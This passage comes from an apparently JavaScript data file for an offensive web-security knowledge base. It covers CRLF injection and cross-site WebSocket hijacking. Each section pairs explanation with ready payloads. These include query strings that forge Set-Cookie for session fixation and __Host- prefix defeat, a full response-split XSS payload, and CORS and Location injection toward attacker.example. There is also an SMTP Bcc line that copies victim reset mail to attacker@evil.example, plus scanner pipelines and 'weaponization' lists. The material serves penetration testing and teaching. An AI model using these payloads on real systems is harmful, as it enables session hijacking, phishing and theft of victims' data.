          'curl is fine for the first pass, but understand its limits: it prints the response it parsed, so if you actually split the response it will show you only the first one and you will underestimate what you achieved. Keep the CR and LF percent-encoded in the URL (curl will not send bare control bytes you type), and pass --path-as-is so curl does not normalize away your traversal segments. When curl shows a hit, go to a raw socket to see every byte, including a second status line.',
          'Test each newline form separately rather than only %0d%0a, because the filter and the sink often disagree about what a line break is. RFC 9112 section 2.2 permits a recipient to treat a single LF as a line terminator and ignore any preceding CR, so a lone %0a is frequently the highest yield probe. The same section says a bare CR must be treated as invalid or replaced with a space, so a lone %0d is the weakest of the three and a hit on it usually means a non-conformant parser worth investigating further.',
          'A negative result on the query string does not close the finding. Repeat every probe in POST body fields, JSON string values, cookie values, and request headers the application reflects, and repeat it on the path. Path based injection is a real and separate case: the Starbucks report on HackerOne (H1 192667) landed the payload in the URL path, not a parameter.',
        ],
        examples: [
          { code: 'curl -isS --path-as-is "https://target/redirect?next=a%0d%0aX-Crlf:%20yes%0d%0aSet-Cookie:%20crlftest=1"', note: 'First pass. Grep the output for X-Crlf and crlftest; either one appearing as a real header is a confirmed hit.' },
          { code: 'echo -en "GET /redirect?next=a%0d%0aSet-Cookie:%20crlftest=1 HTTP/1.1\\r\\nHost: target\\r\\nConnection: close\\r\\n\\r\\n" | ncat --ssl target 443', note: 'Raw socket view. This is the only way to see a second status line if you achieved a full split.' },
          { code: 'Probe each form:  %0a   %0d   %0d%0a   %0a%20   %0d%09   %23%0a   %2f..%0d%0a', note: 'Bare LF often works where CRLF is filtered. A space or tab after the newline survives some normalizers.' },
          { code: 'nuclei -l urls.txt -dast -tags crlf', note: 'Runs dast/vulnerabilities/crlf/crlf-injection.yaml, which fuzzes query and body parts with 41 escape variants and matches on an injected Set-Cookie.' },
        ],
      },
      {
        heading: 'Encodings that get past filters',
        body: [
          'Filters usually block the literal two byte sequence and nothing else, so vary the representation. Double encoding beats a validator that decodes once and a sink that decodes twice: %25%30%61 is the percent-encoding of the literal text %0a, which becomes a newline only after a second decode. Legacy Microsoft %u encoding (%u000a, %u000d) is still decoded on some older IIS and .NET paths. A null byte before the newline sometimes gets through a filter written in a language whose string handling stops at NUL while the sink keeps reading, which is why %00 leads the nuclei escape list.',
          'The unicode trick is the one most often repeated and least often understood. The characters 嘊 (U+560A, %E5%98%8A) and 嘍 (U+560D, %E5%98%8D) were chosen because their code points end in 0A and 0D. They work only when some component narrows a wide character to a single byte and keeps the low byte, or strips the character down to its trailing octet. That is what happened in the 2015 Twitter finding written up by XSS Jigsaw, where the value passed a blocklist as a harmless multibyte character and was mutated into a newline later in the pipeline, and Firefox at the time stripped out of range octets when setting cookies instead of encoding them. Treat this as a class, not a spell: it fires wherever a JVM or similar stack casts a char to a byte, and it does nothing against a component that handles UTF-8 correctly. Test it, but do not conclude the target is safe because it failed. Apache HttpClient was reported for exactly this pair, U+560D followed by U+560A surviving header value filtering and arriving as a real CRLF, in HTTPCLIENT-1974 against 4.5.7 and earlier; note that the maintainers closed it as Invalid and shipped no fix, taking the position that sanitising header values is the caller responsibility, so a library that behaves this way is not necessarily going to change.',
          'Other line terminators are worth a pass because some back-ends and text processors treat them as breaks while filters only look for CR and LF: U+2028 LINE SEPARATOR (%E2%80%A8), U+2029 PARAGRAPH SEPARATOR (%E2%80%A9), and U+0085 NEXT LINE (%C2%85). None of the three is a line terminator to a conformant HTTP/1.1 parser, so a hit here means something in the chain is doing its own text handling rather than reading the message as octets; that is a finding about that component, and you should identify which one before writing it up.',
          'Overlong UTF-8 encodings of LF such as %C0%8A appear in old payload lists. Do not rely on them: RFC 3629 has required conformant decoders to reject overlong sequences since 2003, so this is a historical technique that only fires against a hand rolled decoder. Include it in a fuzz list, but do not build a report around it.',
        ],
        examples: [
          { code: 'Double encode:   %25%30%61  ->  %0a  ->  LF', note: 'Passes a validator that decodes once and fires in a sink that decodes twice.' },
          { code: 'Unicode narrowing:  %E5%98%8D%E5%98%8A  (U+560D U+560A, narrowing to CR then LF)   also try the reverse order', note: 'Only works where a component truncates a wide char to its low byte. Order matters: this pair narrows to CRLF, and the reverse narrows to LF CR, which some parsers still accept. Verify, do not assume.' },
          { code: 'Alternate terminators:  %E2%80%A8   %E2%80%A9   %C2%85', note: 'Line separators many back-ends honour and most CR/LF filters ignore.' },
          { code: 'Legacy IIS:  %u000a   %u000d', note: 'Microsoft %u encoding, decoded only on some older IIS and .NET request paths.' },
        ],
      },
      {
        heading: 'Forge Set-Cookie: fixation, prefix defeat, and cookie tossing',
        body: [
          'An injected Set-Cookie is the highest value use of a single CRLF, because it is the one outcome that does not need a full split and does not need the browser to do anything unusual. Send the victim a link on the real target domain; the response sets whatever cookie you wrote.',
          'Session fixation is the direct play: plant a session identifier you already know, wait for the victim to log in on that session, then use it. The Authentication Bypass entry lists fixation as one bypass among many; what it does not give you is a delivery mechanism on a target that otherwise refuses to accept an attacker supplied session id, and CRLF is that mechanism, because the cookie arrives from the origin itself.',
          'The sharper result is defeating cookie prefixes. The __Host- and __Secure- prefixes exist precisely so that a cookie can only have been set by a secure response from the host itself, which is what makes them a defence against a network attacker or a related-domain attacker writing cookies. Header injection on the real host satisfies that requirement exactly, so a __Host- cookie you set through a split response is indistinguishable from one the application set. Any check that trusts the prefix as proof of origin is void.',
          'Cookie tossing is the third variant and is often the one that chains furthest. Overwrite the cookie half of a double-submit CSRF pair so the server compares your token against your token, or overwrite the OAuth state or PKCE verifier cookie so the callback validates against a value you chose and binds the attacker authorization to the victim session. Shadowing works because a cookie set on a broader path or a parent domain sits alongside the real one as a separate jar entry rather than replacing it, and which of the two the application actually reads is decided by the server side cookie parser, not by the browser. The Session Fixation entry owns that surface: the RFC 6265 ordering rule, the first-wins versus last-wins parser test, and jar overflow. What CRLF adds here is that you need no sibling host and no subdomain takeover to get the write, because the cookie arrives from the target host itself.',
        ],
        examples: [
          { code: '?lang=en%0d%0aSet-Cookie:%20SESSIONID=attacker-known-value;%20Path=/', note: 'Session fixation delivered from the target origin, on a target that would otherwise reject an attacker chosen session id.' },
          { code: '?lang=en%0d%0aSet-Cookie:%20__Host-auth=x;%20Path=/;%20Secure', note: 'Defeats the __Host- prefix guarantee, which is supposed to prove the host itself set the cookie.' },
          { code: '?lang=en%0d%0aSet-Cookie:%20csrftoken=ATTACKER;%20Path=/', note: 'Cookie tossing: the double-submit check now compares the attacker token to the attacker token.' },
          { code: '?lang=en%0d%0aSet-Cookie:%20oauth_state=ATTACKER;%20Path=/', note: 'Overwrite the flow state so the callback binds the attacker authorization into the victim session.' },
        ],
      },
      {
        heading: 'Split a full second response for XSS and phishing',
        body: [
          'To get script running in the target origin you need a response whose Content-Type you control, and appending a second Content-Type after the real one is unreliable because a message with two Content-Type headers is invalid and stacks disagree about what to do. The reliable form is the full split: end the real response with Content-Length: 0 and a blank line, then write a complete new response with your own status line, your own Content-Type: text/html, an accurate Content-Length, and your body. Everything in that second response is yours, including its Content-Security-Policy, which is why splitting escapes a CSP that would otherwise stop the payload.',
          'One special case needs no second response at all. On a redirect, if you inject an empty Location value, some browsers ignore the redirect and render the body instead, so a single injection point that forces an empty Location and then a body gets you script without a status line of your own. Confirm this per browser rather than assuming it.',
          'Another single-response variant is to change how the existing body is decoded. Inject Content-Type with charset=UTF-16 and supply a UTF-16 encoded payload; the surrounding real markup becomes mojibake while your payload decodes to a script tag. This bypasses server side output encoding entirely, because the bytes the encoder produced are no longer being read as the same character set.',
          'A note on a payload you will see everywhere and should stop copying: injecting X-XSS-Protection: 0 to disable the browser XSS filter is dead weight in 2026. Chrome removed the XSS Auditor in Chrome 78 in October 2019, Chromium based Edge followed, and Firefox and Safari never shipped an equivalent. Leaving it in a payload adds bytes and tells a reviewer you copied without checking. It is still worth understanding because you will meet it in every historical writeup.',
        ],
        examples: [
          { code: '?p=a%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a%3Csvg%20onload=alert(document.domain)%3E', note: 'Full split. Count the decoded body yourself: <svg onload=alert(document.domain)> is 35 bytes, and a wrong Content-Length leaves the client waiting or truncates the payload. The second response is attacker authored end to end, so its Content-Type and CSP are the attacker choice.' },
          { code: '?p=a%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E', note: 'Empty Location: some browsers drop the redirect and render the body. This is the Starbucks path-injection shape.' },
          { code: '?p=a%0d%0aContent-Type:%20text/html;%20charset=UTF-16%0d%0a%0d%0a%3C%00s%00c%00r%00i%00p%00t%00%3E%00', note: 'Charset switch: the real encoded body becomes noise and the UTF-16 bytes decode to markup.' },
        ],
      },
      {
        heading: 'Turn one request into two: cache poisoning, response queue poisoning, HTTP/2 splitting',
        body: [
          'The most important correction to make about this attack class is that the classic story, where the victim browser reads your second response, is largely obsolete. It depended on browsers pipelining HTTP/1.1 requests so that a second response could be matched to a second request. Firefox removed its pipelining implementation in Firefox 54 and Chrome never enabled it by default, so a browser today reads one response per request and discards or errors on the rest. The surviving high value targets are not browsers. They are intermediaries.',
          'A shared cache is the first. If you can split a response for a URL that real users request, the cache may store your forged response and serve it to everyone. The nuance that kills most attempts: a CRLF you put in the query string is part of the cache key, so you only poison an entry nobody else will ever request. A real cache poisoning needs the newline to arrive through an unkeyed input, typically a header the origin reflects into a response header but the cache does not key on. That is the same unkeyed-input logic the Web Cache Poisoning entry covers in depth, and CRLF is one more thing an unkeyed header can do once you have found it.',
          'The second and higher impact intermediary target is the connection between the front-end and the back-end. Inject Connection: keep-alive so the back-end does not close the connection after answering, then craft a prefix that combines with the trailing junk of your own request line to form a complete second request. The back-end now emits two responses where the front-end expected one, and every subsequent response on that connection is off by one: the attacker receives responses generated for other authenticated users, and those users receive responses generated for the attacker. This is response queue poisoning, described by PortSwigger, and it converts a low severity header reflection into session theft. It requires a front-end, and some front-ends mitigate it by truncating and closing the connection when a back-end sends more bytes than the promised Content-Length.',
          'The modern way to get this primitive is HTTP/2. HTTP/2 carries header names and values as length-prefixed binary fields, so CR and LF inside a value are ordinary bytes with no structural meaning and no reason for the client library to reject them. If a front-end downgrades HTTP/2 to HTTP/1.1 for the back-end, it re-serializes those values into text and the embedded newlines become real delimiters. That is the PortSwigger HTTP/2 request splitting lab: a header named foo with a value containing a CRLF pair, a blank line, and then a complete GET request line and Host header. Burp Suite lets you type raw CR and LF into HTTP/2 header values for exactly this. See the HTTP Request Smuggling entry for what to do with the desync once you have it.',
        ],
        examples: [
          { code: 'GET /%20HTTP/1.1%0d%0aHost:%20target.example%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1', note: 'Keep the back-end connection open so a second response can be queued behind the first.' },
          { code: 'GET /%20HTTP/1.1%0d%0aHost:%20target.example%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1', note: 'The trailing junk completes a second request, desynchronizing the response queue.' },
          { code: 'HTTP/2 header  foo: bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: target.example', note: 'HTTP/2 values are binary, so CRLF survives the client and becomes structure when the front-end downgrades to HTTP/1.1.' },
        ],
      },
      {
        heading: 'Injecting security headers, and what you cannot do with them',
        body: [
          'A single CRLF lets you add headers, and adding the right header changes the browser security model for that response. The clean case is CORS: if the endpoint sends no Access-Control-Allow-Origin of its own, inject one naming your origin plus Access-Control-Allow-Credentials: true, and attacker JavaScript can then read the victim authenticated response cross origin. Add Access-Control-Expose-Headers to reach tokens carried in response headers. See the CORS Misconfiguration entry for what to do with the read primitive once you have it.',
          'Know the limits so you do not write a false report. You are appending after the headers the server already wrote; you cannot delete one. Two consequences bite. First, if the endpoint already sends an Access-Control-Allow-Origin, your injected second one makes the response carry two, and the browser fetch specification treats more than one as a failure, so you have broken CORS rather than opened it. Injected CORS only works on endpoints that send none. Second, a duplicate Content-Security-Policy is not a replacement: multiple CSP headers are enforced as an intersection, so injecting a permissive policy tightens nothing and cannot loosen the existing one. Conflicting X-Frame-Options behaves the same way, resolving to the more restrictive interpretation.',
          'This is the real argument for going from header injection to a full response split whenever you can. In a split second response you are not appending to anything: the header block is yours alone, so there is no original CORS header to duplicate and no original CSP to intersect with.',
          'Injecting Location is the other single-header win, and it is genuinely different from the Open Redirect entry. There, an intended redirect parameter is validated badly; here there is no redirect feature at all and no allowlist to bypass, because you are writing the Location header yourself. Any URL on the target that reflects into a header becomes a redirector, which is exactly the shape that gets a phishing link past a mail filter and past a user reading the domain.',
        ],
        examples: [
          { code: '?p=a%0d%0aAccess-Control-Allow-Origin:%20https://attacker.example%0d%0aAccess-Control-Allow-Credentials:%20true', note: 'Opens the origin, but only on an endpoint that sends no ACAO of its own; two ACAO headers make the browser reject the response.' },
          { code: '?p=a%0d%0aLocation:%20https://attacker.example', note: 'A redirector on any reflecting endpoint, with no redirect parameter and no allowlist to defeat.' },
        ],
      },
      {
        heading: 'CRLF outside the HTTP response',
        body: [
          'Every line oriented protocol has the same weakness, so once you find a newline that survives, ask what else the value is written into. Mail is the most common second sink: contact forms, invite senders, password reset senders, and support ticket features build SMTP headers from a From, To, Subject, or name field, and a newline there adds recipients or replaces the body of a message that leaves the target own, domain-aligned mail infrastructure. The Email Spoofing entry owns that surface in full, including the PHP mail() additional_headers and fifth argument sinks and the per-MTA switches. The point to carry across here is only that the value you found reaching an HTTP header is very often the same value the mailer writes, so test both sinks the moment you find either.',
          'Server side HTTP clients turn CRLF into request injection, which is SSRF with the request body under your control. The reference case is the PHP SoapClient user_agent option: newlines in it let you terminate the SOAP request headers and write an entire second request, including method, path, Host, Cookie, and body, against an internal service. The RestSharp and Refit CVEs above are the same shape in .NET.',
          'Key-value stores speak line oriented protocols too. Sonar found credential theft in Zimbra by injecting memcached commands through an unsanitized cache key, poisoning the entry that told the system which host and port to hand a user session to, so victim credentials were routed to the attacker. Redis is the same idea reached through SSRF, but check the version before you claim it: since Redis 3.2.7 the tokens POST and Host: are bound to a dedicated securityWarningCommand that logs "Possible SECURITY ATTACK detected" and asynchronously frees the client with no reply, killing browser driven cross protocol scripting into Redis and leaving a log entry behind. It is not aliased to QUIT, so do not expect an +OK. It does not stop a server side SSRF that can write raw bytes, for example through gopher:// or through a CRLF-injectable outbound HTTP client, because that path never has to send those tokens.',
          'Session stores that are line oriented are the highest severity variant, because the injected line becomes server state that is read back and trusted. The 2026 cPanel and WHM authentication bypass (CVE-2026-41940, CVSS 9.8) is the reference case: cpsrvd writes a pre-authentication session file to /var/cpanel/sessions/raw/ before the login completes, raw CR and LF in a Basic Authorization header were written into the pass= field unsanitized, and a malformed cookie skipped the encryption that would otherwise have made the value opaque. Injecting a newline followed by user=root promoted an unauthenticated session into a root WHM session. When you find a CRLF sink, always check whether the value is persisted anywhere line oriented and later reloaded.',
          'And if the sink is a log rather than a header, stop here and read the Log Injection entry, which covers forging entries, terminal escape sequences, breaking SIEM parsing, and pivoting into a log viewer.',
        ],
        examples: [
          { code: 'email=victim@target.tld%0d%0aBcc:%20attacker@evil.example', note: 'Receive a copy of the password reset or verification mail the application sends to the victim.' },
          { code: "new SoapClient(null, ['location'=>$t,'uri'=>$t,'user_agent'=>\"x\\r\\n\\r\\nPOST /internal HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n...\"])", note: 'PHP SoapClient user_agent: newlines let you author an entire second request against an internal service.' },
          { code: 'key=session%0d%0aset attacker_route 0 0 20%0d%0a...', note: 'memcached command injection through an unsanitized cache key, the Zimbra credential theft pattern.' },
        ],
      },
      {
        heading: 'Tools, workflow, and what still works',
        body: [
          'Work outward from a reflected header. Find every parameter that reaches Location, Set-Cookie, or a custom header; probe each with the marker cookie in all newline forms; when one lands, immediately try to escalate from header injection to a full response split, because the split is what carries CSP-proof XSS, a controlled Content-Type, and a second request on the connection.',
          'For scale, crlfuzz is the Go scanner and fits a pipeline: subfinder into httpx into crlfuzz, with -l for a list, -X and -d for POST bodies, -H to carry a session, -x to route through Burp, and -c to tune concurrency. CRLFsuite is the other common scanner and is written in Python despite being described as Go in some references, installed with pip3 install crlfsuite. nuclei covers it in DAST mode against parameterized URLs. All three test the response header sink only, so the mail, memcached, session-file, and outbound-request sinks in the previous section are manual work and are where the severity usually is.',
          'Verify by hand before reporting. Scanners match on a header appearing in the parsed response, which is exactly what a proxy will also produce if it merely forwards a weird value, so pull the raw bytes off a socket and confirm the newline is real. If you are claiming a split, show the second status line. If you are claiming cache poisoning, show a second, uninvolved client receiving your response and show that the newline entered through an unkeyed input rather than the cache key.',
          'Expect most mainstream application frameworks to be immune at the obvious sink, and let that steer where you look. Node throws ERR_INVALID_CHAR from response.setHeader when a value contains CR or LF, PHP header() refuses to emit more than one header from a single call and errors on an embedded newline, Java servlet containers validate header values, and ASP.NET Framework has an enableHeaderChecking setting that encodes CR and LF in headers. What is left, and what is where the live findings are, is proxy configuration that decodes before it writes, template and string concatenation that builds a raw response, server side HTTP client libraries, non-mainstream and embedded HTTP stacks, HTTP/2 to HTTP/1.1 downgrade, and every non-HTTP sink the value also reaches.',
        ],
        examples: [
          { code: 'subfinder -d target.tld -silent | httpx -silent | crlfuzz -s', note: 'Pipeline sweep; -s prints only vulnerable targets.' },
          { code: 'crlfuzz -l urls.txt -X POST -d "next=FUZZ" -H "Cookie: session=..." -x http://127.0.0.1:8080 -c 25', note: 'Authenticated POST testing routed through Burp so every candidate lands in the proxy history.' },
          { code: 'pip3 install crlfsuite', note: 'CRLFsuite is Python, not Go, whatever the cheat sheets say.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Inject Set-Cookie to plant a session identifier the attacker already knows, so the victim authenticates into a session the attacker holds, on a target that would otherwise refuse an attacker supplied session id.',
          'Set a __Host- or __Secure- prefixed cookie, defeating the one guarantee those prefixes exist to provide: that a secure response from the host itself set the cookie.',
          'Overwrite the cookie half of a double-submit CSRF pair so the server validates the attacker token against the attacker token and accepts forged state changing requests as the victim.',
          'Overwrite an OAuth state or PKCE verifier cookie so the callback validates against an attacker chosen value and binds the attacker authorization to the victim session.',
          'Inject a Location header on any reflecting endpoint so a phishing destination is launched from the target real domain and TLS certificate, with no redirect feature and no allowlist to bypass.',
          'Inject Access-Control-Allow-Origin naming the attacker origin plus Access-Control-Allow-Credentials, making the browser treat an attacker site as a trusted origin allowed to read the victim authenticated responses.',
          'Split a full second response so attacker HTML and script are served from the target origin, letting the script act with the victim session inside that origin rather than merely looking like the site.',
          'Poison a shared cache with a forged response so every visitor to a real URL is served the attacker page under the genuine host name.',
          'Poison the response queue between front-end and back-end so the attacker is handed responses generated for authenticated victims and can read and act as them.',
          'Inject SMTP From, Sender, or Reply-To headers so mail leaves the target own mail infrastructure, passing its SPF, DKIM, and DMARC alignment, while claiming a sender the attacker chose.',
          'Inject a client identity header such as X-Forwarded-For or X-Real-IP into a request a proxy forwards, so a downstream component attributes the request to a trusted internal address.',
          'Inject memcached or Redis commands so a lookup that maps a user to a host, port, or session returns an attacker controlled mapping, the pattern Sonar used to steal Zimbra credentials.',
        ],
        why: 'The newline is the delimiter that separates one server-authored field or message from the next, so injecting it promotes attacker data into a position the parser reserves for the server itself: a cookie only the origin could have set, an origin only the server could have trusted, a sender only the domain could have vouched for, or a whole response only the server could have written.',
      },
      tampering: {
        weaponization: [
          'Split the response and serve attacker authored HTML in place of the real page, with a Content-Type and a Content-Security-Policy the attacker chose.',
          'Store that forged response in a shared cache through an unkeyed input so the substitution persists for every visitor rather than for one request.',
          'Overwrite application cookies (feature flags, locale, currency, cart, affiliate, tenant) by injecting Set-Cookie at a broader path or parent domain that shadows the real one.',
          'Inject Content-Length, Content-Type, or Content-Encoding to re-frame the message so bytes the application emitted as data are parsed as something else, including a new message.',
          'Author a complete second request on the connection, via keep-alive injection or HTTP/2 downgrade splitting, so the back-end processes a request the front-end never saw or authorized.',
          'Inject memcached or Redis commands through an unsanitized key so cached values the application later trusts are rewritten.',
          'Add recipients and replace the body of outbound application email through injected SMTP headers.',
          'Write extra key=value lines into a line oriented session or state file so the server reads back state it never wrote.',
        ],
        why: 'Control of the newline is control of framing, not merely of one value, so the attacker rewrites the boundaries that tell every downstream parser where a field, a message, or a record begins and ends, and integrity is lost at the structural level rather than the content level.',
      },
      information_disclosure: {
        weaponization: [
          'Poison the response queue so responses generated for other authenticated users, including their session material and account data, are delivered to the attacker.',
          'Inject a permissive Access-Control-Allow-Origin and Access-Control-Allow-Credentials pair so attacker JavaScript can read the victim authenticated cross-origin responses.',
          'Inject Access-Control-Expose-Headers so tokens and identifiers carried in response headers become readable to attacker script.',
          'Serve script from the target origin through a split response and read same-origin data with the victim session.',
          'Bcc the attacker on outbound password reset, invitation, invoice, or verification mail so the secrets those messages carry are copied out.',
          'Inject a full request into a server side HTTP client (SoapClient user_agent, RestSharp, Refit) to reach and read internal services from the application network position.',
          'Inject memcached or Redis commands that reroute a session or credential lookup so the data is delivered to an attacker controlled host and port.',
        ],
        why: 'Header injection controls the fields that decide who is allowed to read a response and where a message is delivered, so the attacker either becomes an authorized reader in the browser security model or reroutes the delivery of data generated for somebody else.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Write extra trusted keys into a line oriented pre-authentication session file so a reload promotes an unauthenticated session to a privileged one, the cPanel and WHM CVE-2026-41940 pattern where a newline plus user=root in the Basic Authorization value produced a root WHM session.',
          'Run script in the target origin from a split response so it inherits the victim session and drives privileged actions the attacker account cannot perform.',
          'Author a second request that the front-end never inspected, reaching internal or administrative endpoints behind the proxy that enforces the authorization boundary.',
          'Inject a complete request into a server side HTTP client so it is issued from inside the network perimeter with whatever access the application host already has.',
          'Inject an authorization-bearing cookie or client identity header that a downstream component treats as proof of role or of internal origin.',
        ],
        why: 'Two mechanisms do the work: the newline lets attacker data become a trusted key in state the server later reads back as its own, and it lets a request be authored from inside a trust boundary, so the attacker inherits whatever that stored state or that network position already grants.',
      },
      denial_of_service: {
        weaponization: [
          'Inject a short or zero Content-Length that truncates the real body, then get that response cached, so every visitor receives a blank or broken page.',
          'Inject Content-Encoding declaring a compression the body does not use, so the client fails to decode the response and the page errors out.',
          'Inject Set-Cookie that shadows the session cookie with an invalid value at a broader path, repeatedly logging the victim out and, until the shadowing cookie is cleared, preventing login.',
        ],
        why: 'Because framing headers decide how a client interprets the bytes that follow, a single injected header can make a valid response unusable, and a cache multiplies that from one victim to every user of the URL.',
      },
      repudiation: {
        weaponization: [
          'Inject newlines into a value that is written to a log so fabricated entries attribute actions to another user or to localhost (see the Log Injection entry for the full technique).',
          'Split the response so the access log records one ordinary request while the client actually received attacker authored content, leaving no record of what was served.',
          'Send forged application email from the target own mail infrastructure so a false record of a request, approval, or notification exists in a mailbox and appears domain-authenticated.',
        ],
        why: 'The record of what happened is itself a line oriented artefact, so the same newline that forges a header forges the evidence, and in the split-response case the server log and the bytes the victim received no longer describe the same event.',
      },
    },
  },

  {
    id: 'websocket-hijacking',
    name: 'Cross-Site WebSocket Hijacking (CSWSH)',
    summary: 'Open a WebSocket to the target from an attacker controlled page so the browser attaches the victim cookies to the handshake, giving the attacker a bidirectional channel bound to the victim session.',
    tags: ['client-side', 'session', 'websocket'],
    executionContext: {
      where: "In the victim's browser, as JavaScript running in the attacker's own origin, driving a socket that the target server has bound to the victim's session.",
      detail: "This is the mirror image of XSS: the script runs in the attacker origin, not the target origin, and it never needs to. The WebSocket handshake is an ordinary HTTP/1.1 GET that the victim browser sends to the target host, and the browser attaches the victim cookies for that host exactly as it would for an image or a script tag. The same origin policy and CORS simply do not apply to WebSockets: the browser sends an Origin header but enforces nothing on the response, so there is no gate stopping the attacker page from reading the frames that come back. The flaw lives on the target WebSocket server, which fails to validate Origin and requires no unpredictable value in the handshake. The effect lands in two places at once: the attacker page holds the read and write ends of the channel in the victim browser, and every frame is processed by the WebSocket handler on the target host under the victim identity and privileges. Two variants move the execution point: a WebSocket proxy endpoint runs the tunnelled bytes as TCP connections originating from the target host itself, and WebSocket smuggling takes effect in the reverse proxy, before the request ever reaches the application.",
    },
    howTo: [
      {
        heading: 'Root cause, and why this beats CSRF',
        body: [
          'A WebSocket connection starts life as a normal HTTP request carrying Connection: Upgrade, Upgrade: websocket, Sec-WebSocket-Version: 13 and a random Sec-WebSocket-Key. The server answers 101 Switching Protocols with a Sec-WebSocket-Accept hash of that key, and from then on the TCP connection carries framed messages in both directions. Because it begins as a plain HTTP request, the browser attaches cookies for the destination host, and because a WebSocket is not a fetch, no CORS preflight happens and no response header is required to permit the caller.',
          'Do not mistake Sec-WebSocket-Key for a security control. It is not authentication and it is not a nonce the attacker has to guess: it exists so a caching proxy or a misconfigured server cannot accidentally produce a response that looks like a successful upgrade. The browser generates it automatically on every handshake, including the attacker one.',
          'This is what separates CSWSH from ordinary CSRF (see the CSRF entry for the write only case). CSRF forges a request but the same origin policy blocks the attacker from reading the response, so it is a blind write primitive. A hijacked WebSocket gives the attacker both directions on the same channel: send a frame, read the reply. That makes it a data theft primitive as well as an action primitive, which is why the same missing check scores far higher on a socket than on a form post.',
        ],
        examples: [
          { code: 'GET /chat HTTP/1.1\nHost: target.example\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==\nOrigin: https://attacker.tld\nCookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2', note: 'The handshake the attacker page causes. The Origin is the attacker, the Cookie is the victim.' },
          { code: 'HTTP/1.1 101 Switching Protocols\nConnection: Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=', note: 'A 101 in response to an attacker Origin is the whole vulnerability. There is no header the server could add to stop the attacker reading frames.' },
        ],
      },
      {
        heading: 'Where to look and how to map the protocol',
        body: [
          'Find the sockets first. In Burp, filter proxy history for responses with status 101, or open the WebSockets history tab. In the browser, use the Network tab WS filter. In the JavaScript bundle, grep for new WebSocket(, io( for Socket.IO, SockJS, @stomp/stompjs, mqtt.connect, and for hardcoded ws:// or wss:// URLs, since the endpoint host is often a different subdomain from the app.',
          'The features that use sockets are the features worth stealing: live chat and customer support widgets, notification feeds, collaborative editors, trading and order book views, dashboards that stream telemetry, build and log tailing, and admin consoles that stream events. These are also the features most likely to replay history on connect, which is what makes a hijack immediately valuable.',
          'Do not assume the frames are a bespoke JSON API. Check the negotiated Sec-WebSocket-Protocol in the handshake response and the path: mqtt or mqttv3.1 and a path like /mqtt means you are talking to a message broker, v12.stomp means STOMP, and an EIO query parameter means Socket.IO framing. A broker behind a socket turns the finding into topic subscription abuse, where wildcard topics such as # and + can read every user traffic at once.',
          'Once you can send frames, enumerate the message schema before you try to exploit anything. Capture a full legitimate session, note which frame the real client sends first, and note which frames the server pushes unprompted. The bootstrap frame that arrives immediately after connect is frequently a full user object, and sometimes carries a session token or an anti CSRF token.',
        ],
        examples: [
          { code: 'Burp filter: show only responses with status 101, then right click the handshake and open the WebSockets history for that connection.', note: 'Fastest way to inventory every socket a target opens.' },
          { code: 'grep -rnoE "wss?://[a-zA-Z0-9._:/%?=&-]+" app.js | sort -u', note: 'Pull hardcoded socket endpoints out of a bundle; the WS host is often a separate subdomain with its own weaker config.' },
          { code: 'Socket.IO: connect with ?EIO=4, send 40 to open the namespace, then 42["message","hello"]. Reply 3 to a 2 ping to stay alive.', note: 'Socket.IO adds framing on top of WebSocket; without the handshake and heartbeat the connection dies before you test anything.' },
        ],
      },
      {
        heading: 'Test the Origin check, then bypass it',
        body: [
          'Test this in two phases, because one tool cannot do both halves. Phase one proves the server side: take a real authenticated handshake and replay it from a non browser client with the Origin header removed, then with Origin set to a domain you own, then with Origin: null. If the server still returns 101 and the socket still behaves as your user, there is no enforced Origin check. Phase two proves it is actually reachable: load a page on a domain you control and open the socket from browser JavaScript, because only the browser can decide whether the victim cookie is really attached.',
          'Phase one alone is not a finding. A raw client can send any Origin it likes but has no victim cookie, so it only tells you what the server would accept. Phase two alone is slower to diagnose, because a failure could be an Origin check or a cookie policy and you cannot tell which. Run both.',
          'When an Origin check does exist, attack the matching logic, but remember what an Origin actually is. It serializes to scheme, host and optional port only, with no path and no query, so the Referer style tricks of appending ?target.com or using target.com@attacker.tld do not apply here. From a browser you can only present an origin you genuinely control, plus null. That leaves four practical bypasses: a domain that satisfies a prefix match, a domain that satisfies a suffix match, the null origin from a sandboxed iframe or a data URL document, and any subdomain of the target where you have XSS or a subdomain takeover.',
          'The subdomain case is the one that keeps paying out. In the Gitpod WebSocket vulnerability the server performed no Origin validation at all, and the researchers served their JavaScript from a workspace on a *.gitpod.io subdomain, which also satisfied the cookie policy because SameSite is scoped to the registrable domain, not the origin. Any target that hands users a subdomain, or that has one subdomain with XSS, has a same site attacker.',
        ],
        examples: [
          { code: 'websocat --insecure -H="Origin: https://attacker.tld" -H="Cookie: session=VICTIM_OR_YOUR_OWN" wss://target.example/chat', note: 'Phase one: does the server hand back 101 for a foreign Origin? -H can swallow following arguments, so use the = form.' },
          { code: 'websocat --insecure -H="Cookie: session=..." wss://target.example/chat', note: 'Same handshake with no Origin header at all. Many servers only compare when the header is present.' },
          { code: 'Prefix match bug: server checks origin.startsWith("https://target.com") -> host https://target.com.attacker.tld passes.', note: 'Register the lookalike and serve the PoC from it.' },
          { code: 'Suffix match bug: server checks origin.endsWith("target.com") -> host https://eviltarget.com passes.', note: 'A registrable lookalike defeats a naive endsWith.' },
          { code: '<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket(\'wss://target.example/chat\')</script>"></iframe>', note: 'Opaque origin: the handshake goes out with Origin: null. Works only if null is on the allowlist.' },
